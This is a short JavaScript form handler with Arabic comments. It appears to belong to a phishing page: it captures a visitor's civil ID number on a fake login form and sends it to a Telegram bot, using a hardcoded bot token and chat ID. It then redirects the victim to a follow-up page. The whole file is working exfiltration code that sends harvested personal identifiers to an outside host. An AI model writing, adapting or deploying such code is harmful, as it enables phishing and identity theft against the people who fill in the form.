document.getElementById("form1").addEventListener("submit", function(e) {
    e.preventDefault();  // منع الإرسال الافتراضي للنموذج

    const phone = document.getElementById("nomberform").value.trim();  // الحصول على الرقم المدني من المستخدم

    if (!phone) {
      alert("يرجى إدخال الرقم المدني.");
      return;
    }

    const token = "7484126870:AAEDSU1tM_kBFwSJ0IpQT0NmuWYzW8wq4_E";  // استخدم التوكن الخاص بك
    const chatId = "6454807559";  // استخدم الـ Chat ID الخاص بك

    const message = `
      📥 تسجيل دخول جديد:
      📞 الرقم المدني: ${phone}
    `;

    // إرسال البيانات إلى تلجرام
    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message
      })
    })
    .then(response => {
      if (response.ok) {
        window.location.href = "select.html";  // انتقل إلى الصفحة الجديدة بعد الإرسال
      } else {
        alert("فشل في إرسال البيانات.");
      }
    })
    .catch(error => {
      console.error("⚠️ خطأ في الاتصال:", error);
      alert("حدث خطأ أثناء الإرسال.");
    });
  });